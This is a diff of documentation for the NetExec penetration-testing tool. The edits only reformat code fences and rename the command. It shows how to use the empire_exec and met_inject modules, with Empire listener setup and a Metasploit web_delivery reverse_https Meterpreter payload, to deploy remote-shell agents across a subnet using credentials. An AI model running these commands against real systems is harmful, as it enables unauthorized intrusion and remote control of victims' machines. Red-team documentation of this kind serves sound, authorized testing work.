@@ -14,8 +14,8 @@ We can use the `empire_exec` module to execute an Empire Agent's initial stager.
 
 * First setup the rest API:
 
-```
-#~ python powershell-empire --rest --user empireadmin --pass Password123!
+```bash
+python powershell-empire --rest --user empireadmin --pass Password123!
 [*] Loading modules from: /home/mpgn/Tools/Empire/lib/modules/
  * Starting Empire RESTful API on port: 1337
  * RESTful API token: l5l051eqiqe70c75dis68qjheg7b19di7n8auzml
@@ -24,7 +24,7 @@ We can use the `empire_exec` module to execute an Empire Agent's initial stager.
 
 * Second setup a listener:
 
-```
+```bash
 (Empire: listeners) > set Name test
 (Empire: listeners) > set Host 192.168.10.3
 (Empire: listeners) > set Port 9090
@@ -43,7 +43,7 @@ We can use the `empire_exec` module to execute an Empire Agent's initial stager.
 
 The username and password that nxc uses to authenticate to Empire's RESTful API are stored in the nxc.conf file located at \~/.nxc/nxc.conf:
 
-```
+```bash
 [Empire]
 api_host=127.0.0.1
 api_port=1337
@@ -58,8 +58,8 @@ password=abc123
 
 * Then just run the `empire_exec` module and specify the listener name:
 
-```
-#~ NetExec 192.168.10.0/24 -u username -p password -M empire_exec -o LISTENER=test
+```bash
+nxc 192.168.10.0/24 -u username -p password -M empire_exec -o LISTENER=test
 ```
 
 ## Meterpreter
@@ -68,26 +68,26 @@ We can use the `metinject` module launch a meterpreter using [Invoke-MetasploitP
 
 On your Metasploit instance, run the following commands
 
-```
+```bash
 use exploit/multi/script/web_delivery
 ```
 
 The SRVHOST and SRVPORT variables are used for running the webserver to host the script
 
-```
+```bash
 set SRVHOST 10.211.55
 set SRVPORT 8443
 ```
 
 The `target` variable determines what type of script we're using. `2` is for PowerShell
 
-```
+```bash
 set target 2
 ```
 
 Pick your payload. In this case, we'll use a reverse https meterpreter payload
 
-```
+```bash
 set payload windows/meterpreter/reverse_https
 set LHOST 10.211.55
 set LPORT 443
@@ -95,13 +95,13 @@ set LPORT 443
 
 Run the exploit
 
-```
+```bash
 run -j
 ```
 
 Once run, the web\_delivery module will spin up the webserver to host the script and reverse listener for our meterpreter session.
 
-```
+```bash
 msf exploit(web_delivery) > run -j
 [*] Exploit running as background job.
 
@@ -113,6 +113,6 @@ msf exploit(web_delivery) > run -j
 
 * Then just run the `met_inject` module and specify the LHOST and LPORT values:
 
-```
-#~ NetExec 192.168.10.0/24 -u username -p password -M met_inject -o SRVHOST=192.168.10.3 SRVPORT=8443 RAND=eYEssEwv2D SSL=http
+```bash
+nxc 192.168.10.0/24 -u username -p password -M met_inject -o SRVHOST=192.168.10.3 SRVPORT=8443 RAND=eYEssEwv2D SSL=http
 ```
